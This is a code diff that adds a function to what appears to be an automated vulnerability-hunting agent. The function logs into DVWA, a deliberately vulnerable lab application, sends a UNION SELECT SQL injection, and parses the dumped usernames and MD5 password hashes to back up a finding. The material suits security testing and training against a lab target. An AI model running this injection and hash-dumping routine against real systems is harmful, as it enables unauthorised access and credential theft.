@@ -108,3 +108,83 @@ export function isStuckAtDvwaLogin(events, { window = 20 } = {}) {
 export function getDvwaCookies(huntId) {
   return cookieJars.get(huntId) || '';
 }
+
+/**
+ * dvwaSqliDump — system-run fresh UNION SELECT dump on DVWA /vulnerabilities/sqli/.
+ *
+ * PROOF-GATE AUTO-FILE (2 Nov 2026): when the proof gate fires for sqli and the
+ * brain never emits claim_finding, the SYSTEM runs one fresh dump itself via the
+ * proven backend path (fresh login → security=low → UNION SELECT user,password
+ * FROM users#), extracts ≥2 MD5 hashes, and the caller builds the claim with
+ * fresh evidence + a self-contained replay command.
+ *
+ * This is a permanent system-level fix: future hunts arrive with the filing
+ * path already working instead of depending on the model to transcribe hashes.
+ *
+ * Returns { ok:true, hashes:[...], rows:[...] } or { ok:false, error, detail }.
+ * hashes = unique lowercase MD5 strings; rows = [{user, hash}] parsed from the
+ * DVWA "First name: X / Surname: <md5>" rendering.
+ */
+export async function dvwaSqliDump({ huntId, target }) {
+  const base = String(target || '').replace(/\/+$/, '');
+  if (!base) return { ok: false, error: 'no_target' };
+
+  // Fresh login (handles per-request CSRF token + sets security=low).
+  const login = await dvwaLogin({ huntId, target: base });
+  if (!login.ok) return { ok: false, error: 'login_failed', detail: login.error };
+
+  try {
+    const jar = cookieJars.get(huntId) || '';
+
+    // GET the sqli page for a fresh form token (best-effort; low-security
+    // DVWA does not require it for the id parameter).
+    let token = '';
+    try {
+      const pageRes = await fetch(`${base}/vulnerabilities/sqli/`, {
+        headers: { Cookie: jar },
+      });
+      const pageHtml = await pageRes.text();
+      const tm = pageHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
+                 pageHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
+      if (tm) token = tm[1];
+    } catch { /* token is best-effort */ }
+
+    // POST the UNION SELECT injection. DVWA low-security query:
+    //   SELECT first_name, last_name FROM users WHERE user_id = '$id'
+    // so UNION SELECT user,password maps user→first_name, md5→last_name.
+    const injection = `1' UNION SELECT user,password FROM users#`;
+    const body = new URLSearchParams({ id: injection, Submit: 'Submit' });
+    if (token) body.set('user_token', token);
+
+    const dumpRes = await fetch(`${base}/vulnerabilities/sqli/`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        Cookie: jar,
+      },
+      body: body.toString(),
+      redirect: 'follow',
+    });
+    const dumpHtml = await dumpRes.text();
+
+    // Extract MD5 hashes (the password column). Dedupe, lowercase.
+    const hashMatches = dumpHtml.match(/\b[a-f0-9]{32}\b/gi) || [];
+    const hashes = [...new Set(hashMatches.map(h => h.toLowerCase()))];
+
+    // Parse user rows from DVWA's "First name: X<br />Surname: <md5>" rendering.
+    const rows = [];
+    const rowRe = /First name:\s*([^<]+?)<br\s*\/?>\s*Surname:\s*([a-f0-9]{32})/gi;
+    let m;
+    while ((m = rowRe.exec(dumpHtml)) !== null) {
+      rows.push({ user: m[1].trim(), hash: m[2].toLowerCase() });
+    }
+
+    if (hashes.length < 2) {
+      return { ok: false, error: 'insufficient_hashes', detail: `found ${hashes.length} hash(es), need >=2` };
+    }
+
+    return { ok: true, hashes, rows, hashCount: hashes.length };
+  } catch (e) {
+    return { ok: false, error: 'dump_failed', detail: String(e && e.message || e).slice(0, 300) };
+  }
+}
